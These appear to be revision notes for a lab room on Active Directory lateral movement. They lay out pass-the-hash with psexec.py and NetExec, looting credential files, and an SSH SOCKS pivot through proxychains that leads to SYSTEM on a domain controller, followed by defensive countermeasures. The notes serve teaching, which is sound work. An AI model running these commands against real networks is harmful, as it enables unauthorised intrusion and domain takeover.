# 🔗 Complete AD Lateral Movement Chain

> **Topic:** Intro to AD Lateral Movement
>
> **Purpose:** Consolidated revision of the complete attack path demonstrated in the room.

---

# 🧭 Attack Path Overview

```text
Initial Compromise
      ↓
SSH Access to WebServer
      ↓
Remote Execution
      ↓
SYSTEM on WRK
      ↓
Harvest Local Admin NT Hash
      ↓
Pass-the-Hash
      ↓
Administrator on SERVER1
      ↓
Discover Domain Admin Hash
      ↓
Pivot Through WebServer
      ↓
Reach Domain Controller
      ↓
Pass-the-Hash
      ↓
SYSTEM on Domain Controller
```

---

# 1️⃣ Remote Execution

The room first demonstrates PsExec against WRK.

```text
jdoe credentials
      ↓
NetExec pre-check
      ↓
(Pwn3d!)
      ↓
psexec.py
      ↓
SYSTEM
```

---

# 2️⃣ Credential Discovery

After obtaining SYSTEM on WRK:

```cmd
type C:\Users\Administrator\Documents\loot.txt
```

A local Administrator NT hash is discovered.

---

# 3️⃣ Credential Reuse

NetExec tests the recovered local Administrator hash against multiple systems:

```bash
nxc smb 192.168.13.61 192.168.13.51 -u Administrator -H fa....12 --local-auth
```

The supplied lab shows administrative access on both hosts.

---

# 4️⃣ Pass-the-Hash

Use the NT hash directly:

```bash
psexec.py -hashes :fa......12 Administrator@192.168.13.51
```

This produces a SYSTEM shell on SERVER1.

---

# 5️⃣ Discover Higher-Value Credentials

On SERVER1:

```cmd
type C:\Users\Administrator\Documents\da_creds.txt
```

The supplied lab finds a Domain Administrator hash.

This demonstrates the lateral movement loop:

```text
Move
 ↓
Harvest
 ↓
Move Again
```

---

# 6️⃣ Network Restriction

The Domain Controller cannot be reached directly from the AttackBox.

```text
AttackBox
   X
   |
   X
Domain Controller
```

But the WebServer can reach the internal network.

---

# 7️⃣ Pivot

Create a SOCKS proxy:

```bash
ssh -f -D 1080 jdoe@192.168.13.71 -N
```

Configure ProxyChains:

```text
socks4 127.0.0.1 1080
```

---

# 8️⃣ Reach the DC Through the Tunnel

Validate the Domain Admin hash:

```bash
proxychains nxc smb 192.168.13.100 -u Administrator -H 250......ea
```

Then execute:

```bash
proxychains psexec.py -hashes :25.....ea thm.loc/Administrator@192.168.13.100
```

---

# 9️⃣ Final Access

The supplied lab reaches the Domain Controller:

```text
hostname
```

```text
RDC1
```

and obtains a SYSTEM shell.

---

# 🧠 The Lateral Movement Loop

```text
┌───────────────────────┐
│       COMPROMISE      │
└──────────┬────────────┘
           ↓
┌───────────────────────┐
│      MOVE REMOTELY    │
└──────────┬────────────┘
           ↓
┌───────────────────────┐
│   HARVEST CREDENTIALS │
└──────────┬────────────┘
           ↓
┌───────────────────────┐
│    REUSE CREDENTIALS  │
└──────────┬────────────┘
           ↓
┌───────────────────────┐
│    COMPROMISE HOST    │
└──────────┬────────────┘
           ↓
        MOVE AGAIN
```

---

# 🎯 Core Lessons

1. Valid credentials can be more valuable than a new exploit.
2. Local Administrator access can enable SYSTEM-level remote execution.
3. Credential reuse can rapidly expand access.
4. A local Administrator hash can become dangerous when passwords are reused.
5. A compromised server may contain credentials for much higher-privileged accounts.
6. Network segmentation can prevent direct access but does not eliminate risk when a pivot host exists.
7. SSH SOCKS forwarding can provide access to otherwise unreachable TCP services.
8. The final objective may require combining several techniques rather than relying on one vulnerability.

---

# 🛡️ Defensive Perspective

The same chain can be disrupted at multiple points:

```text
LAPS
 ↓
Break Local Admin Hash Reuse

Least Privilege
 ↓
Remove Unnecessary Admin Access

Credential Guard
 ↓
Protect LSASS

Tiered Admin / PAW
 ↓
Prevent DA Credentials on Lower-Tier Hosts

Firewall
 ↓
Restrict SMB / WinRM / RDP

Segmentation
 ↓
Limit Pivot Paths

Monitoring
 ↓
Detect Abnormal Authentication / Execution
```

---

# 💡 Final Takeaway

The central lesson of the room is:

> **Lateral movement is a chain, not a single technique.**

A single compromised host can provide:

```text
Credentials
+
Execution
+
Network Access
```

which can lead to another host, more credentials, greater privileges, and eventually the Domain Controller.

The room's complete loop is:

```text
Move → Harvest → Move Again
```
